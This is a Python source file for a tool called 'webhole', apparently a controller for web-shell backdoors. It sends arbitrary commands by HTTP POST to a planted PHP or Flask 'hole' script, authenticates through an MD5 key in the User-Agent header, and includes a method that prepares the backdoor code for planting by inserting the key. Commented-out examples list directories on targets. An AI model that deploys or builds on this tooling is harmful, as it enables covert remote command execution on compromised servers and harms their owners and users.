#!/usr/bin/env python
# -*- coding: utf-8 -*-
#   |                                                         |   #
# --+---------------------------------------------------------+-- #
#   |    Code by : yasserbdj96                                |   #
#   |    Email   : yasserbdj96@gmail.com                      |   #
#   |    GitHub  : github.com/yasserbdj96                     |   #
#   |    WebSite : yasserbdj96.github.io                      |   #
#   |    Sponsor : github.com/sponsors/yasserbdj96            |   #
#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
#   |                                                         |   #
#   |    All posts with #yasserbdj96 All views are my own.    |   #
#   |                                                         |   #
# --+---------------------------------------------------------+-- #
#   |                                                         |   #
#START{
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(__file__)))
import requests
from webhole.modules.tomd5 import tomd5
from webhole.modules.url_fix import url_fix
from webhole.modules.del_line_startswith import del_line_startwith
from webhole.__version__ import __version__,__source__
import json
import re

sys.stdout.reconfigure(encoding='utf-8')

class webhole:
    def __init__(self, url=None, user_key=None, Return=True, hole=None, nkey=None, pkgs=False):
        self.Return = Return
        self.messages = []  # To collect error messages
        self.fatal_error = False  # Indicates if initialization failed

        self.__version__ = "WebHole Version : "+__version__
        self.__package_version__ = None
        self.__source__="WebHole Source : "+__source__
        self.__package_source__ = None

        self.packages = "packages"
        self.config = "config.json"

        if hole is not None:
            self.package_name = None
            if nkey is not None:
                print(self.hole(pkg=hole,nkey=nkey))
            else:
                print(self.hole(pkg=hole))
            return 

        if pkgs:
            print(self.pkgs())
            return

        self.url = url_fix(url)
        self.user_key = tomd5(user_key)
        self.header = {'User-Agent': self.user_key}

        try:
            self.is_connect, self.connect_one = self.first_connect()
        except requests.exceptions.RequestException as e:
            msg = f"❌ Connection Error: Failed to establish connection to '{url}'. Verify network connectivity and server availability.\nDetails: {str(e)}"
            self._handle_error(msg)
            return
        except Exception as e:
            msg = f"❌ Initialization Error: Unexpected error occurred during setup.\nDetails: {str(e)}"
            self._handle_error(msg)
            return

        if not self.is_connect:
            msg = f"❌ Connection Failed: {self.connect_one}"
            self._handle_error(msg)
            return

        try:
            self.pakg_name = self.connect_one.split("#")[1]
            config_path = os.path.join(os.path.dirname(__file__), self.packages, self.pakg_name, self.config)

            try:
                with open(config_path, "r", encoding="utf-8") as file:
                    self.data = json.load(file)
            except FileNotFoundError:
                msg = f"❌ Configuration Error: Package configuration not found at '{config_path}'"
                self._handle_error(msg)
                return
            except json.JSONDecodeError:
                msg = f"❌ Configuration Error: Invalid JSON format in '{config_path}'"
                self._handle_error(msg)
                return

            if self.pakg_name != self.data["package-name"]:
                msg = f"❌ Validation Error: Package name mismatch. Expected '{self.data['package-name']}', received '{self.pakg_name}'"
                self._handle_error(msg)
                return

            command_zero_output = self.connect(self.data["command-0"])
            if self.data["command-0-output"] != command_zero_output:
                msg = f"❌ Validation Error: Initial command verification failed. Expected '{self.data['command-0-output']}', received '{command_zero_output}'"
                self._handle_error(msg)
                return

            self.connect_to_pkg = True
            self.package_name = self.data["package-name"]
            self.__package_version__ = self.package_name+" Version : "+self.data["values"]["package_version"]
            self.__package_source__ = self.package_name+" Source : "+self.data["values"]["package_source"]
            self.__author__ = self.data["values"]["author"]

            for key, value in self.data["auto-call"].items():
                setattr(self, key, self.connect(value))

        except IndexError:
            msg = "❌ Protocol Error: Invalid server response format"
            self._handle_error(msg)
            return
        except KeyError as e:
            msg = f"❌ Configuration Error: Missing required key in config - {str(e)}"
            self._handle_error(msg)
            return

    def _handle_error(self, message):
        """Handle errors based on Return flag."""
        if self.Return:
            self.messages.append(message)
            self.fatal_error = True
        else:
            print(message)
            sys.exit(1)

    def connect(self, command=None, cli=None, value=None, cf=True, **kwargs):
        try:
            self.command_function = False
            self.command_return = False
            self.command_function_path = ""
            self.command_function_fn = ""
            self.command_default = False
            self.formatted_command = ""

            if command and not cli and not value:
                commandx = command
            elif cli and not command and not value:
                start = self.data["start"]
                end = self.data["end"]
                command_file_path = os.path.join(
                    os.path.dirname(__file__),
                    self.packages,
                    self.pakg_name,
                    self.data["commands"][cli]["command-file"]
                )

                try:
                    with open(command_file_path, "r", encoding="utf-8") as file:
                        content = file.read()
                except FileNotFoundError:
                    return f"❌ Command Error: CLI template '{cli}' not found"

                content = content[len(start):] if content.startswith(start) and start else content
                content = content[:-len(end)] if content.endswith(end) and end else content

                for key, val in kwargs.items():
                    try:
                        settingx = self.data["commands"][cli]["command-arguments"][key]
                        content = content.replace(settingx, val)
                    except KeyError:
                        return f"❌ Argument Error: Invalid parameter '{key}' for command '{cli}'"

                    try:
                        if cf:
                            self.command_function_path = self.data["commands"][cli]["command-function"]["path"].format(self=self)
                            self.command_function_fn = self.data["commands"][cli]["command-function"]["function"]
                            self.command_function = True
                    except KeyError:
                        pass

                    try:
                        self.command_return_var = self.data["commands"][cli]["command-return"]
                        self.command_return = True
                    except KeyError:
                        pass

                    try:
                        self.command_config = self.data["commands"][cli]["command-default"]
                        self.formatted_command = self.format_command_data(self.command_config, {"self": self})
                        self.command_default = True
                        content = self.replace_none_with_value(content, self.formatted_command)
                    except KeyError:
                        pass

                commandx = content
            elif value and not command and not cli:
                try:
                    return self.data["values"][value]["value-get"].format(self=self)
                except KeyError:
                    return f"❌ Value Error: Requested value '{value}' not found in configuration"
            else:
                return "❌ Parameter Error: Invalid parameter combination. Use either command, cli, or value"

            response = requests.post(self.url, headers=self.header, data={'command': commandx})
            if response.status_code != 200:
                return f"❌ Server Response Error: Received HTTP {response.status_code} - {response.reason}"

            response_text = del_line_startwith(response.text, "#")
            processed_response = self.styling_response(
                response_text,
                self.command_function,
                self.command_function_path,
                self.command_function_fn
            )

            if self.command_return:
                setattr(self, self.command_return_var, processed_response)

            return processed_response

        except requests.exceptions.RequestException as e:
            return f"❌ Network Error: Failed to execute command - {str(e)}"
        except Exception as e:
            return f"❌ Execution Error: {str(e)}"

    def first_connect(self):
        try:
            response = requests.post(self.url, headers=self.header, timeout=10)
            response.raise_for_status()

            first_line = response.text.splitlines()[0]
            if not first_line.startswith("#"):
                return [False, "❌ Protocol Error: Invalid server handshake format"]

            text = response.text.strip()
            if ':-:' not in text:
                return [False, "❌ Protocol Error: Invalid authentication structure"]

            pkg_name, key = text.split(':-:', 1)
            if key != self.user_key:
                return [False, "❌ Authentication Error: Invalid credentials provided"]

            return [True, pkg_name]

        except requests.exceptions.HTTPError as e:
            return [False, f"❌ HTTP Error: {str(e)}"]
        except requests.exceptions.ConnectionError:
            return [False, "❌ Connection Refused: Server unavailable or unreachable"]
        except requests.exceptions.Timeout:
            return [False, "❌ Timeout Error: Server did not respond in time"]
        except Exception as e:
            return [False, f"❌ Connection Error: {str(e)}"]

    def styling_response(self, response, command_function, command_function_path, command_function_fn):
        if not command_function:
            return response

        try:
            import importlib
            module_path = f"webhole.{command_function_path}"
            module = importlib.import_module(module_path)
            function_fn = getattr(module, command_function_fn)
            return function_fn(response)
        except ImportError:
            error_msg = f"❌ Module Error: Could not import processing module '{module_path}'"
            return error_msg if self.Return else print(error_msg) or response
        except AttributeError:
            error_msg = f"❌ Function Error: Processing function '{command_function_fn}' not found"
            return error_msg if self.Return else print(error_msg) or response

    def format_command_data(self, command_dict, context):
        try:
            formatted_data = {}
            for key, value in command_dict.items():
                if isinstance(value, str):
                    formatted_data[key] = value.format(**context)
                else:
                    formatted_data[key] = value
            return formatted_data
        except KeyError as e:
            raise ValueError(f"❌ Template Error: Missing context parameter '{e}'") from None

    def replace_none_with_value(self, text, replacements):
        pattern = r'(\$?\w+)\s*=\s*(None|null|nil)'
        def replacer(match):
            key = match.group(1).lstrip("$")
            return f"{match.group(1)} = {repr(replacements.get(key, match.group(2)))}"
        return re.sub(pattern, replacer, text)
    
    def info(self, *infos):
        return "\n".join(f"{getattr(self, info, 'Attribute not found')}" for info in infos)
    
    def help(self):
        result = []
        for key, value in self.data["commands"].items():
            description = value.get("command-description", "No description")
            result.append(f"{key} : {description}")
        return "\n".join(result)
    
    def hole(self,pkg=None,nkey=None):
        if pkg is None:
            pkg = self.package_name
        config_path = os.path.dirname(__file__)+"/"+self.packages+"/"+pkg+"/config.json"
        with open(config_path, "r", encoding="utf-8") as file:
            data = json.load(file)
        hole = data.get("hole-code", "No hole code available")
        file_path = os.path.dirname(__file__)+"/"+self.packages+"/"+pkg+"/"+hole
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            if nkey is not None:
                content = content.replace("__key__", nkey)
        return content
    

    def pkgs(self):
        results = []
        search_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "packages")

        for root, dirs, files in os.walk(search_path):
            if "config.json" in files:
                file_path = os.path.join(root, "config.json")
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                        name = data.get("package-name")
                        version = data.get("values", {}).get("package_version")
                        if name:
                            results.append(f"{name} → {version}")
                except Exception as e:
                    print(f"Error reading {file_path}: {e}")

        return "\n".join(results)  # joins all lines in one string

# Example usage
'''
if __name__ == "__main__":
    try:
        python_flask_connect = webhole(url="http://127.0.0.1:50", user_key="123456789")
        print(python_flask_connect.connect(cli="tree -f", path="."))
        print(python_flask_connect.connect(cli="ls", path="."))
        print(python_flask_connect.connect(cli="cd", path="."))
        print(python_flask_connect.connect(cli="cd", path=".."))


        php_connect = webhole(url="http://127.0.0.1:51/php.php", user_key="123456789")
        print(php_connect.connect(cli="tree", path=".."))
        print(php_connect.connect("echo 'this is python-flask:';"))
        print(php_connect.connect(cli="ls", path="."))
        print(php_connect.connect(cli="cd", path="."))
        print(php_connect.connect(cli="cd", path=".."))
    except Exception as e:
        print(f"Application Error: {str(e)}")
'''
#}END.